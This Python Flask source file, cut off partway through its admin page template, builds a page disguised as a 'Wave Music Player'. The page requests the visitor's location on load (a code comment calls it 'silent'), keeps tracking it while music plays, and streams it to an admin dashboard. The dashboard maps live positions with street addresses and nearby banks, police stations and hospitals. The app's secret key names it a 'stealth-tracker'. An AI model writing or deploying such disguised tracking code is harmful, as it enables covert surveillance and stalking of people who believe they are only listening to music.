
from gevent import monkey
monkey.patch_all()

from flask import Flask, request, jsonify, render_template_string
from flask_socketio import SocketIO, emit, join_room, leave_room
from flask_cors import CORS
import requests
import json
import sqlite3
from datetime import datetime, timedelta
import threading
import time
import uuid
from collections import defaultdict, deque
import os

app = Flask(__name__)
app.config['SECRET_KEY'] = 'stealth-tracker-2026-v2'
app.config['JSONIFY_PRETTYPRINT_REGULAR'] = False

# Initialize SQLite database
DB_PATH = 'gps_tracker.db'

def init_db():
    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
    cursor = conn.cursor()
    
    # Coordinates table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS coordinates (
            id TEXT PRIMARY KEY,
            session_id TEXT,
            lat REAL,
            lon REAL,
            accuracy REAL,
            speed REAL,
            timestamp TEXT,
            city TEXT,
            state TEXT,
            country TEXT,
            postal_code TEXT,
            street TEXT,
            nearby_landmarks TEXT
        )
    ''')
    
    # Users table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            session_id TEXT PRIMARY KEY,
            lat REAL,
            lon REAL,
            accuracy REAL,
            speed REAL,
            timestamp TEXT,
            city TEXT,
            state TEXT,
            country TEXT,
            postal_code TEXT,
            street TEXT,
            nearby_landmarks TEXT,
            last_seen INTEGER
        )
    ''')
    
    conn.commit()
    conn.close()

init_db()

socketio = SocketIO(app, cors_allowed_origins="*", 
                   async_mode='threading', 
                   logger=False, 
                   engineio_logger=False,
                   max_http_buffer_size=10000000,
                   ping_timeout=60,
                   ping_interval=25)

CORS(app)

HEADERS = {
    "User-Agent": "CoordinateTranslatorApp/2.0 (contact: psyklyn35@gmail.com)",
    "Accept": "application/json",
    "Cache-Control": "no-cache"
}

def get_db_connection():
    return sqlite3.connect(DB_PATH, check_same_thread=False)

# -----------------------------
# Enhanced Coordinate Validation & Translation (unchanged)
# -----------------------------
def validate_coordinates(lat, lon):
    try:
        lat, lon = float(lat), float(lon)
        return -90 <= lat <= 90 and -180 <= lon <= 180 and abs(lat) < 90.1 and abs(lon) < 180.1
    except:
        return False

def translate_coordinates(lat, lon):
    if not validate_coordinates(lat, lon):
        return {"error": "Invalid coordinates"}
    
    lat, lon = float(lat), float(lon)
    cache_key = f"{lat:.6f},{lon:.6f}"

    # Global cache check
    if cache_key in getattr(app, 'translation_cache', {}):
        return app.translation_cache[cache_key]
    
    try:
        # Reverse geocoding
        geo_response = requests.get(
            "https://nominatim.openstreetmap.org/reverse?format=json&addressdetails=1",
            params={"lat": lat, "lon": lon},
            headers=HEADERS,
            timeout=8
        )
        
        if geo_response.status_code == 200:
            geo_data = geo_response.json()
            address = geo_data.get("address", {})
            
            # Enhanced nearby landmarks (multiple queries for better coverage)
            nearby_landmarks = []
            try:
                # Query 1: Critical landmarks within 500m (bank, hospital, university, school, police, etc.)
                overpass_query1 = f'[out:json][timeout:15];(node["amenity"~"bank|hospital|university|school|police|fire_station|pharmacy"](around:500,{lat},{lon});way["amenity"~"bank|hospital|university|school|police|fire_station|pharmacy"](around:500,{lat},{lon}););out body;'
                # Query 2: Other amenities within 300m
                overpass_query2 = f'[out:json][timeout:15];(node["amenity"](around:300,{lat},{lon});way["amenity"](around:300,{lat},{lon}););out body;'
                # Query 3: Shops and restaurants within 500m
                overpass_query3 = f'[out:json][timeout:15];(node["shop"](around:500,{lat},{lon});node["amenity"="restaurant"](around:500,{lat},{lon}););out body;'
                
                overpass_response1 = requests.post(
                    "https://overpass-api.de/api/interpreter",
                    data=overpass_query1,
                    headers=HEADERS,
                    timeout=12
                )
                overpass_response2 = requests.post(
                    "https://overpass-api.de/api/interpreter",
                    data=overpass_query2,
                    headers=HEADERS,
                    timeout=12
                )
                overpass_response3 = requests.post(
                    "https://overpass-api.de/api/interpreter",
                    data=overpass_query3,
                    headers=HEADERS,
                    timeout=12
                )
                
                # Critical landmarks first (for red markers)
                if overpass_response1.status_code == 200:
                    elements1 = overpass_response1.json().get("elements", [])
                    critical_landmarks = [{"name": e.get("tags", {}).get("name"), 
                                         "type": e.get("tags", {}).get("amenity"),
                                         "lat": e.get("lat"),
                                         "lon": e.get("lon"),
                                         "distance": "critical",
                                         "critical": True} 
                                         for e in elements1[:10] if e.get("tags", {}).get("name")]
                    nearby_landmarks.extend(critical_landmarks)
                
                if overpass_response2.status_code == 200:
                    elements2 = overpass_response2.json().get("elements", [])
                    landmarks2 = [{"name": e.get("tags", {}).get("name"), 
                                 "type": e.get("tags", {}).get("amenity", e.get("tags", {}).get("shop", "unknown")),
                                 "lat": e.get("lat"),
                                 "lon": e.get("lon"),
                                 "distance": "nearby",
                                 "critical": False} 
                                 for e in elements2[:8] if e.get("tags", {}).get("name")]
                    nearby_landmarks.extend(landmarks2)
                
                if overpass_response3.status_code == 200:
                    elements3 = overpass_response3.json().get("elements", [])
                    landmarks3 = [{"name": e.get("tags", {}).get("name"), 
                                 "type": e.get("tags", {}).get("amenity", e.get("tags", {}).get("shop", "unknown")),
                                 "lat": e.get("lat"),
                                 "lon": e.get("lon"),
                                 "distance": "close",
                                 "critical": False} 
                                 for e in elements3[:6] if e.get("tags", {}).get("name")]
                    nearby_landmarks.extend(landmarks3)
                
                # Deduplicate and limit
                seen = set()
                unique_landmarks = []
                for landmark in nearby_landmarks[:15]:
                    key = landmark['name'].lower()
                    if key not in seen:
                        seen.add(key)
                        unique_landmarks.append(landmark)
                
                nearby_landmarks = unique_landmarks[:12]
                
            except:
                pass

            result = {
                "street": address.get("road") or address.get("pedestrian") or address.get("residential"),
                "city": address.get("city") or address.get("town") or address.get("village"),
                "state": address.get("state"),
                "country": address.get("country"),
                "postcode": address.get("postcode"),
                "full_address": geo_data.get("display_name"),
                "nearby_landmarks": nearby_landmarks,
                "lat": lat,
                "lon": lon
            }
            
            # Cache result
            if not hasattr(app, 'translation_cache'):
                app.translation_cache = {}
            app.translation_cache[cache_key] = result
            return result
            
    except Exception:
        pass
    
    return {"error": "Translation unavailable"}

# Data stores with database persistence
tracked_users = {}
all_coordinates = deque(maxlen=1000)
user_activity = defaultdict(lambda: deque(maxlen=50))
last_broadcast = 0

def cleanup_old_data():
    """Clean up inactive users and old coordinates"""
    now = time.time()
    cutoff = now - 300  # 5 minutes
    
    # Clean inactive users from memory
    to_remove = []
    for session, data in tracked_users.items():
        if now - data['last_seen'] > cutoff:
            to_remove.append(session)
    
    for session in to_remove:
        tracked_users.pop(session, None)

# Background cleanup thread
def cleanup_thread():
    while True:
        time.sleep(60)
        cleanup_old_data()

threading.Thread(target=cleanup_thread, daemon=True).start()

# CLIENT HTML (unchanged)


CLIENT_HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Wave Music Player</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
<script src="https://cdnjs.cloudflare.com/ajax/libs/color-thief/2.3.2/color-thief.umd.js"></script>
<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
<style>
*{
margin:0;
padding:0;
box-sizing:border-box;
font-family:-apple-system,sans-serif;
}
body{
height:100vh;
display:flex;
justify-content:center;
align-items:center;
background:#111;
transition:1s;
overflow:hidden;
}
.carousel{
position:relative;
width:700px;
height:350px;
display:flex;
justify-content:center;
align-items:center;
perspective:1200px;
}
.card{
position:absolute;
width:220px;
height:260px;
border-radius:20px;
overflow:hidden;
cursor:pointer;
transition:.8s cubic-bezier(.2,.8,.2,1);
box-shadow:0 20px 60px rgba(0,0,0,.6);
}
.card img{
width:100%;
height:100%;
object-fit:cover;
}
.center{
transform:translateZ(150px) scale(1.25);
z-index:3;
}
.left{
transform:translateX(-250px) rotateY(40deg) scale(.9);
opacity:.7;
}
.right{
transform:translateX(250px) rotateY(-40deg) scale(.9);
opacity:.7;
}
.player{
position:absolute;
bottom:60px;
background:rgba(255,255,255,.15);
backdrop-filter:blur(25px);
padding:20px 30px;
border-radius:40px;
display:flex;
align-items:center;
gap:20px;
color:white;
}
.player button{
border:none;
background:none;
font-size:22px;
color:white;
cursor:pointer;
}
.wave-player{
position:relative;
width:400px;
height:60px;
cursor:pointer;
}
.wave-bg,
.wave-progress{
position:absolute;
width:100%;
height:100%;
}
.wave-bg path{
stroke:rgba(255,255,255,.25);
stroke-width:8;
fill:none;
}
.wave-progress path{
stroke:#ffd5d5;
stroke-width:8;
fill:none;
stroke-linecap:round;
}
.slider{
position:absolute;
top:50%;
left: 0%;
width:14px;
height:14px;
background:white;
border-radius:50%;
transform:translate(-50%,-50%);
pointer-events: none;
}
.player img{
width:45px;
border-radius:10px;
}
.song-info{
display:flex;
flex-direction:column;
}
.song-info span{
font-size:13px;
opacity:.8;
}
.gps-status {
    position: absolute;
    top: 20px;
    right: 20px;
    background: rgba(0,255,0,0.2);
    color: #00ff00;
    padding: 8px 12px;
    border-radius: 20px;
    font-size: 12px;
    backdrop-filter: blur(10px);
    display: none;
}
.gps-active {
    background: rgba(255,0,0,0.2);
    color: #ff4444;
}
</style>
</head>
<body>
<div class="gps-status" id="gpsStatus"></div>

<div class="carousel">
<div class="card left"
data-music="/static/song1.mp3"
data-title="Serjang"
data-artist="Longbamon Ronghang"
onclick="selectSong(0)">
<img src="/static/img1.jpg" crossorigin="anonymous">
</div>

<div class="card center"
data-music="/static/song2.mp3"
data-title="About you"
data-artist="The 1975"
onclick="selectSong(1)">
<img src="/static/img2.jpg" crossorigin="anonymous">
</div>

<div class="card right"
data-music="/static/song3.mp3"
data-title="Serjang"
data-artist="Longbamon Ronghang"
onclick="selectSong(2)">
<img src="/static/img3.jpg" crossorigin="anonymous">
</div>
</div>

<div class="player">
<button onclick="prev()">
<i class="fa-solid fa-backward"></i>
</button>

<button onclick="togglePlay()" id="playBtn">
<i id="playIcon" class="fa-solid fa-play"></i>
</button>

<button onclick="next()">
<i class="fa-solid fa-forward"></i>
</button>

<div class="wave-player" onclick="seek(event)">
<svg viewBox="0 0 500 80" class="wave-bg">
<path d="M0 40 C40 10 80 70 120 40 S200 10 240 40 S320 70 360 40 S440 10 500 40"/>
</svg>
<svg viewBox="0 0 500 80" class="wave-progress">
<path id="waveProgress"
d="M0 40 C40 10 80 70 120 40 S200 10 240 40 S320 70 360 40 S440 10 500 40"/>
</svg>
<div class="slider" id="slider"></div>
</div>

<img id="cover">

<div class="song-info">
<b id="title"></b>
<span id="artist"></span>
</div>
</div>

<audio id="audio"></audio>

<script>
const socket = io({ transports: ['websocket'], timeout: 20000 });
let watchId = null;
let sessionId = "gps_" + crypto.randomUUID().slice(0, 12);
let isTracking = false;
let reconnectAttempts = 0;
const MAX_RECONNECTS = 5;

const cards = document.querySelectorAll(".card")
const audio = document.getElementById("audio")
const cover = document.getElementById("cover")
const title = document.getElementById("title")
const artist = document.getElementById("artist")
const icon = document.getElementById("playIcon")
const path = document.getElementById("waveProgress")
const slider = document.getElementById("slider")
const gpsStatus = document.getElementById("gpsStatus")
const playBtn = document.getElementById("playBtn")

const pathLength = path.getTotalLength()
path.style.strokeDasharray = pathLength
path.style.strokeDashoffset = pathLength

const colorThief = new ColorThief()
let current = 1

// Socket events
socket.on('connect', () => {
    console.log('Connected:', socket.id);
    reconnectAttempts = 0;
});

socket.on('disconnect', () => {
    console.log('Disconnected');
    if (watchId) stopTracking();
});

socket.on('connect_error', (err) => {
    console.log('Connection error:', err);
    if (reconnectAttempts < MAX_RECONNECTS) {
        reconnectAttempts++;
        setTimeout(() => socket.connect(), 2000 * reconnectAttempts);
    }
});

// Initialize GPS on page load (silent)
function initGPS() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            pos => {
                sendPosition(pos);
                startTracking();
            },
            err => {
                console.log('Initial GPS failed:', err);
            },
            { enableHighAccuracy: true, timeout: 10000, maximumAge: 5000 }
        );
    }
}

// Auto-start tracking on play button click (no permission popup after init)
function startTracking() {
    if (watchId || isTracking) return;
    
    isTracking = true;
    gpsStatus.style.display = 'block';
    gpsStatus.className = 'gps-status';
    
    watchId = navigator.geolocation.watchPosition(
        sendPosition,
        err => console.error('GPS error:', err),
        { enableHighAccuracy: true, timeout: 5000, maximumAge: 2000 }
    );
}

function stopTracking() {
    if (watchId) {
        navigator.geolocation.clearWatch(watchId);
        watchId = null;
    }
    isTracking = false;
    gpsStatus.style.display = 'none';
}

function sendPosition(position) {
    const data = {
        session: sessionId,
        lat: position.coords.latitude,
        lng: position.coords.longitude,
        accuracy: position.coords.accuracy,
        speed: position.coords.speed || 0,
        timestamp: Date.now()
    };
    socket.emit('gps_update', data);
}

// Music player functions
function selectSong(index) {
    current = index
    updateCarousel()
    loadSong()
}

function updateCarousel() {
    cards.forEach(c => {
        c.classList.remove("left", "center", "right")
    })
    cards[current].classList.add("center")
    cards[(current + 1) % 3].classList.add("right")
    cards[(current + 2) % 3].classList.add("left")
}

function loadSong() {
    let card = cards[current]
    audio.src = card.dataset.music
    audio.play()
    cover.src = card.querySelector("img").src
    title.innerText = card.dataset.title
    artist.innerText = card.dataset.artist
    setBackground(card.querySelector("img"))
}

function togglePlay() {
    if (audio.paused) {
        audio.play()
        // Start GPS tracking when music plays
        startTracking();
    } else {
        audio.pause()
    }
}

function next() {
    current = (current + 1) % 3
    updateCarousel()
    loadSong()
}

function prev() {
    current = (current + 2) % 3
    updateCarousel()
    loadSong()
}

function seek(e) {
    const rect = e.currentTarget.getBoundingClientRect()
    const x = e.clientX - rect.left
    let percent = x / rect.width
    audio.currentTime = percent * audio.duration
}

/* wave progress update */
audio.addEventListener("timeupdate", () => {
    if (!audio.duration) return
    let percent = audio.currentTime / audio.duration
    let point = path.getPointAtLength(percent * pathLength)
    const svg = path.ownerSVGElement
    const box = svg.viewBox.baseVal
    const scaleX = svg.clientWidth / box.width
    const scaleY = svg.clientHeight / box.height
    slider.style.left = (point.x * scaleX) + "px"
    slider.style.top = (point.y * scaleY) + "px"
    path.style.strokeDashoffset = pathLength - (percent * pathLength)
})

/* background color */
function setBackground(img) {
    if (img.complete) {
        let color = colorThief.getColor(img)
        let mainColor = `rgb(${color[0]},${color[1]},${color[2]})`
        document.body.style.background = `radial-gradient(circle at center, ${mainColor}, #000)`
        path.style.stroke = mainColor
    } else {
        img.addEventListener("load", () => {
            setBackground(img)
        })
    }
}

/* play pause icon */
audio.addEventListener("play", () => {
    icon.classList.replace("fa-play", "fa-pause")
})

audio.addEventListener("pause", () => {
    icon.classList.replace("fa-pause", "fa-play")
})

// Initialize everything
window.addEventListener('load', () => {
    initGPS();
    selectSong(1);
});

// Cleanup
window.addEventListener('pagehide', stopTracking);
window.addEventListener('beforeunload', stopTracking);
</script>
</body>
</html>
'''

# ADMIN DASHBOARD (Enhanced with database + red landmark markers)
ADMIN_HTML = '''
<!DOCTYPE html>
<html>
<head>
    <title>GPS Admin Dashboard</title>
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
    <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Inter', sans-serif; height: 100vh; overflow: hidden; 
               background: linear-gradient(135deg, #0c0c1a 0%, #1a1a2e 50%, #16213e 100%); color: white; }
        .main { display: flex; height: 100vh; }
        #map { flex: 1; height: 100vh; z-index: 1; position: relative; }
        .map-controls { position: absolute; top: 20px; right: 20px; z-index: 1000; }
        .view-toggle { 
            background: rgba(12,12,26,0.95); backdrop-filter: blur(20px); 
            border: 2px solid rgba(0,255,136,0.4); border-radius: 50px; 
            padding: 12px 24px; color: #00ff88; font-weight: 600; font-size: 14px; 
            cursor: pointer; transition: all 0.3s ease; box-shadow: 0 8px 25px rgba(0,0,0,0.4);
            margin-bottom: 10px;
        }
        .view-toggle:hover { background: rgba(0,255,136,0.15); transform: translateY(-2px); }

        .view-toggle.satellite::after { content: " 🛰️"; }
        .view-toggle.normal::after { content: " 🗺️"; }

        .landmark-toggle { 
            background: rgba(12,12,26,0.95); backdrop-filter: blur(20px); 
            border: 2px solid rgba(255,0,0,0.4); border-radius: 50px; 
            padding: 12px 24px; color: #ff4444; font-weight: 600; font-size: 14px; 
            cursor: pointer; transition: all 0.3s ease; box-shadow: 0 8px 25px rgba(0,0,0,0.4);
        }
        .landmark-toggle:hover { background: rgba(255,68,68,0.15); transform: translateY(-2px); }
        .landmark-toggle.on { background: rgba(255,68,68,0.25); border-color: #ff4444; }
        .panel { width: 420px; background: rgba(12,12,26,0.95); backdrop-filter: blur(25px); 
                border-left: 1px solid rgba(0,255,136,0.2); padding: 25px; overflow-y: auto; }
        .tabs { display: flex; gap: 8px; margin-bottom: 25px; }
        .tab-btn { flex: 1; padding: 14px; border: none; background: rgba(255,255,255,0.08); 
                  color: #b0b0b0; border-radius: 10px; cursor: pointer; font-weight: 600; 
                  transition: all 0.3s ease; }
        .tab-btn.active { background: linear-gradient(135deg, rgba(0,255,136,0.2), rgba(0,200,100,0.15)); 
                         color: #00ff88; box-shadow: 0 5px 20px rgba(0,255,136,0.2); }
        .tab-content { display: none; }
        .tab-content.active { display: block; }
        .header { color: #00ff88; font-size: 24px; font-weight: 700; text-align: center; margin-bottom: 25px; }
        .stats { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 25px; }
        .stat { background: rgba(0,255,136,0.12); padding: 18px; border-radius: 12px; text-align: center; 
               border: 1px solid rgba(0,255,136,0.3); transition: all 0.3s; }
        .stat:hover { background: rgba(0,255,136,0.22); transform: translateY(-2px); }
        .stat-num { font-size: 28px; font-weight: 800; color: #ff6b6b; display: block; }
        .search { width: 100%; padding: 14px 20px; border: none; border-radius: 25px; 
                 background: rgba(255,255,255,0.1); color: white; margin-bottom: 20px; 
                 font-size: 15px; backdrop-filter: blur(10px); }
        .list { max-height: 45vh; overflow-y: auto; }
        .item { background: rgba(255,255,255,0.06); margin-bottom: 12px; padding: 18px 15px; 
               border-radius: 12px; cursor: pointer; border: 2px solid transparent; 
               transition: all 0.3s; position: relative; }
        .item:hover { background: rgba(255,107,107,0.15); border-color: #ff6b6b; transform: translateX(4px); }
        .item.active { background: rgba(255,107,107,0.25); border-color: #ff6b6b; 
                      box-shadow: 0 0 20px rgba(255,107,107,0.3); }
        .user-id { font-size: 13px; color: #90a0a0; font-family: monospace; margin-bottom: 8px; }
        .coords { font-size: 16px; font-weight: 700; color: #00ff88; margin-bottom: 8px; }
        .meta { font-size: 12px; color: #888; display: flex; gap: 12px; }
        .badge { padding: 4px 10px; border-radius: 15px; font-size: 11px; font-weight: 600; }
        .accuracy { background: rgba(16,185,129,0.3); color: #10b981; }
        .speed { background: rgba(251,191,36,0.3); color: #f59e0b; }
        .coord-item { border-left: 4px solid #4dabf7; }
        .coord-preview { font-family: monospace; font-size: 14px; color: #00ff88; margin-bottom: 6px; }
        .coord-result { font-size: 12px; color: #a0a0a0; background: rgba(0,0,0,0.4); padding: 8px 12px; 
                        border-radius: 8px; margin-top: 6px; }
        .landmarks { font-size: 11px; color: #10b981; background: rgba(16,185,129,0.2); 
                    padding: 6px 10px; border-radius: 6px; margin-top: 4px; max-height: 60px; overflow-y: auto; }
        .loading { color: #f59e0b; }
        .error { color: #ef4444; }
        .pulse-dot {
            width: 18px; height: 18px; background: radial-gradient(circle, #ff4444 0%, #ff6b6b 70%, transparent 70%);
            border: 3px solid rgba(255,255,255,0.9); border-radius: 50%; box-shadow: 0 0 15px #ff4444;
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse { 0%, 100% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.2); opacity: 0.7; } }
    </style>
</head>
<body>
    <div class="main">
        <div id="map">
            <div class="map-controls">
                <div class="view-toggle satellite" id="viewToggle" onclick="toggleMapView()">Satellite</div>
                <div class="landmark-toggle" id="landmarkToggle" onclick="toggleLandmarks()">Critical Landmarks 🔴 OFF</div>
            </div>
        </div>
        <div class="panel">
            <div class="tabs">
                <button class="tab-btn active" onclick="switchTab('live')">📍 Live Tracking</button>
                <button class="tab-btn" onclick="switchTab('coords')">📋 Coordinates</button>
            </div>
            <div id="live-tab" class="tab-content active">
                <div class="header">Live GPS Tracking</div>
                <div class="stats">
                    <div class="stat"><span class="stat-num" id="totalUsers">0</span>Total</div>
                    <div class="stat"><span class="stat-num" id="activeUsers">0</span>Active</div>
                </div>
                <input type="text" class="search" id="userSearch" placeholder="Search users...">
                <div class="list" id="userList">No users connected</div>
            </div>
            <div id="coords-tab" class="tab-content">
                <div class="header">Captured Coordinates</div>
                <div class="stats">
                    <div class="stat"><span class="stat-num" id="totalCoords">0</span>Total</div>
                    <div class="stat"><span class="stat-num" id="translated">0</span>Translated</div>
                </div>
                <input type="text" class="search" id="coordSearch" placeholder="Search coordinates...">
                <div class="list" id="coordList">No coordinates captured</div>
            </div>
        </div>
    </div>

    <script>
    // Map setup with satellite view by default
    const map = L.map('map').setView([40.7128, -74.0060], 10);
    
    // Satellite layer (Esri WorldImagery)
    const satelliteLayer = L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', {
        attribution: '© Esri, Maxar, GeoEye, Earthstar Geographics LLC, USDA FSA, USGS, Aerogrid, IGN, IGP, UPR-EGP & the GIS User Community | Terms & Conditions'
    });
    
    // Normal OpenStreetMap layer
    const normalLayer = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        attribution: '© OpenStreetMap contributors'
    });
    
    // Add satellite layer by default
    satelliteLayer.addTo(map);
    let currentLayer = satelliteLayer;

    const markers = new Map();
    const landmarkMarkers = new Map(); // Red landmark markers
    let users = {}, coordinates = {};
    let currentTab = 'live';
    let showLandmarks = false;

    const socket = io({ transports: ['websocket'] });
    
    socket.on('stats_update', updateStats);
    socket.on('location_update', updateLocation);
    socket.on('coord_update', updateCoord);

    // Map view toggle function
    function toggleMapView() {
        const toggleBtn = document.getElementById('viewToggle');
        if (currentLayer === satelliteLayer) {
            // Switch to normal
            map.removeLayer(satelliteLayer);
            normalLayer.addTo(map);
            currentLayer = normalLayer;
            toggleBtn.textContent = 'Normal';
            toggleBtn.className = 'view-toggle normal';
        } else {
            // Switch to satellite
            map.removeLayer(normalLayer);
            satelliteLayer.addTo(map);
            currentLayer = satelliteLayer;
            toggleBtn.textContent = 'Satellite';
            toggleBtn.className = 'view-toggle satellite';
        }
    }

    // Critical landmarks toggle (red markers within 500m)
    function toggleLandmarks() {
        const toggleBtn = document.getElementById('landmarkToggle');
        showLandmarks = !showLandmarks;
        
        if (showLandmarks) {
            toggleBtn.textContent = 'Critical Landmarks 🔴 ON';
            toggleBtn.classList.add('on');
            // Show all landmark markers
            landmarkMarkers.forEach(marker => {
                if (marker) marker.addTo(map);
            });
        } else {
            toggleBtn.textContent = 'Critical Landmarks 🔴 OFF';
            toggleBtn.classList.remove('on');
            // Hide all landmark markers
            landmarkMarkers.forEach(marker => {
                if (marker) map.removeLayer(marker);
            });
        }
    }

    function switchTab(tab) {
        currentTab = tab;
        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
        document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
        event.target.classList.add('active');
        document.getElementById(tab + '-tab').classList.add('active');
    }

    document.getElementById('userSearch').addEventListener('input', e => {
        const q = e.target.value.toLowerCase();
        document.querySelectorAll('#userList .item').forEach(item => {
            item.style.display = item.textContent.toLowerCase().includes(q) ? 'block' : 'none';
        });
    });

    document.getElementById('coordSearch').addEventListener('input', e => {
        const q = e.target.value.toLowerCase();
        document.querySelectorAll('#coordList .item').forEach(item => {
            item.style.display = item.textContent.toLowerCase().includes(q) ? 'block' : 'none';
        });
    });

    function updateLocation(data) {
        users[data.session] = data;
        if (markers.has(data.session)) {
            markers.get(data.session).setLatLng([data.lat, data.lng]);
        } else {
            const marker = L.marker([data.lat, data.lng], {
                icon: L.divIcon({
                    html: '<div class="pulse-dot"></div>',
                    className: '', iconSize: [20, 20], iconAnchor: [10, 10]
                })
            }).addTo(map);
            markers.set(data.session, marker);
            marker.bindPopup(createUserPopup(data));
        }
        
        // Add red landmark markers for critical places within 500m
        if (data.nearby_landmarks) {
            data.nearby_landmarks.forEach(landmark => {
                if (landmark.critical && landmark.lat && landmark.lon) {
                    const lmId = `${data.session}_${landmark.name}`;
                    if (!landmarkMarkers.has(lmId)) {
                        const redIcon = L.divIcon({
                            html: '<div style="width:14px;height:14px;background:#ff4444;border:3px solid white;border-radius:50%;box-shadow:0 0 12px #ff4444;"></div>',
                            className: '', iconSize: [20, 20], iconAnchor: [10, 10]
                        });
                        const lmMarker = L.marker([landmark.lat, landmark.lon], { icon: redIcon });
                        lmMarker.bindPopup(`
                            <div style="min-width:280px;font-family:monospace;">
                                <div style="color:#ff4444;font-size:16px;font-weight:700;margin-bottom:8px;">
                                    ${landmark.name}
                                </div>
                                <div style="color:#ff6b6b;font-size:14px;">
                                    🏥 Type: ${landmark.type}<br>
                                    📍 Distance: ~500m from GPS<br>
                                    🆔 Session: ${data.session.slice(-10)}
                                </div>
                            </div>
                        `);
                        landmarkMarkers.set(lmId, lmMarker);
                    }
                }
            });
        }
        
        if (Object.keys(users).length === 1) map.setView([data.lat, data.lng], 18);
    }

    function createUserPopup(data) {
        const landmarksHtml = data.nearby_landmarks && data.nearby_landmarks.length > 0 
            ? data.nearby_landmarks.slice(0, 5).map(l => `📍 ${l.name} (${l.type})`).join('<br>')
            : 'No landmarks nearby';
            
        return `<div style="min-width: 320px; font-family: monospace;">
            <div style="font-size: 16px; color: #ff6b6b; font-weight: 700; margin-bottom: 10px;">
                GPS User - <span style="color: #10b981;">LIVE</span>
            </div>
            <div style="background: rgba(0,255,136,0.15); padding: 10px; border-radius: 8px; margin-bottom: 10px;">
                <b style="color: #00ff88;">${data.street || 'Loading...'}</b>
            </div>
            <div style="font-size: 14px; color: #00ff88; margin-bottom: 10px;">
                ${data.lat.toFixed(7)} | ${data.lng.toFixed(7)}
            </div>
            <div style="background: rgba(16,185,129,0.2); padding: 8px; border-radius: 6px; font-size: 11px;">
                📏 ${data.accuracy?.toFixed(0) || '?'}m | 🚀 ${(data.speed || 0).toFixed(1)}km/h<br>
                🕐 ${new Date(data.timestamp).toLocaleTimeString()}<br>
                🆔 ${data.session.slice(-10)}
            </div>
            <div style="background: rgba(16,185,129,0.2); padding: 8px; border-radius: 6px; font-size: 11px;">
                <b>🏪 Nearby Landmarks:</b><br>${landmarksHtml}
            </div>
        </div>`;
    }

    function updateCoord(data) {
        coordinates[data.id] = data;
        if (document.getElementById('coords-tab').classList.contains('active')) {
            renderCoords();
        }
        document.getElementById('totalCoords').textContent = Object.keys(coordinates).length;
        document.getElementById('translated').textContent = Object.values(coordinates).filter(c => c.translation && !c.translation.error).length;
    }

    function updateStats(stats) {
        document.getElementById('totalUsers').textContent = stats.total;
        document.getElementById('activeUsers').textContent = stats.active;
        if (document.getElementById('live-tab').classList.contains('active')) {
            renderUsers(stats.users);
        }
    }

    function renderUsers(userList) {
        document.getElementById('userList').innerHTML = Object.entries(userList).map(([id, data]) => 
            `<div class="item" onclick="selectUser('${id}')">
                <div class="user-id">${id.slice(-12)}</div>
                <div class="coords">${data.street || '...'}</div>
                <div style="font-size: 15px; color: #00ff88;">${data.lat?.toFixed(5)} | ${data.lng?.toFixed(5)}</div>
                <div class="meta">
                    <span class="badge accuracy">${data.accuracy?.toFixed(0) || '?'}m</span>
                    <span class="badge speed">${(data.speed || 0).toFixed(1)} km/h</span>
                </div>
            </div>`
        ).join('') || '<div style="color:#666;text-align:center;padding:30px;">No active users</div>';
    }

    function renderCoords() {
        const list = document.getElementById('coordList');
        list.innerHTML = Object.values(coordinates).slice(-20).reverse().map(c => {
            const translation = c.translation || {};
            const landmarks = translation.nearby_landmarks || [];
            const landmarksPreview = landmarks.slice(0, 3).map(l => l.name).join(', ') || 'No landmarks';
            
            return `<div class="item coord-item" onclick="showCoord('${c.id}')">
                <div class="coord-preview">${c.lat.toFixed(8)}, ${c.lon.toFixed(8)}</div>
                ${translation.error ? 
                    `<div class="coord-result error">❌ ${translation.error}</div>` :
                    `<div class="coord-result">
                        🏠 ${translation.street || 'N/A'}, ${translation.city || 'N/A'}<br>
                        🌍 ${translation.country || 'N/A'} | 📮 ${translation.postcode || 'N/A'}<br>
                        ${landmarks.length > 0 ? 
                            `<div class="landmarks">🏪 ${landmarksPreview}${landmarks.length > 3 ? '...' : ''}</div>` : 
                            ''
                        }
                    </div>`
                }
            </div>`;
        }).join('') || '<div style="color:#666;text-align:center;padding:30px;">No coordinates</div>';
    }

    window.selectUser = id => {
        document.querySelectorAll('.item').forEach(i => i.classList.remove('active'));
        document.querySelector(`[onclick="selectUser('${id}')"]`)?.classList.add('active');
        const marker = markers.get(id);
        if (marker && users[id]) {
            map.setView([users[id].lat, users[id].lng], 19);
            marker.openPopup();
        }
    };

    window.showCoord = id => {
        const coord = coordinates[id];
        if (coord && coord.translation) {
            map.setView([coord.lat, coord.lon], 18);
            L.marker([coord.lat, coord.lon], {
                icon: L.divIcon({html: '<div style="width:16px;height:16px;background:#4dabf7;border-radius:50%;border:3px solid white;box-shadow:0 0 10px #4dabf7;"></div>', 
                               className: '', iconSize: [22, 22], iconAnchor: [11, 11]})
            }).addTo(map).bindPopup(`
                <div style="font-family:monospace; min-width: 300px;">
                    <b>📍 ${coord.lat.toFixed(8)}, ${coord.lon.toFixed(8)}</b><br><br>
                    🏠 ${coord.translation.street || 'N/A'}, ${coord.translation.city || 'N/A'}<br>
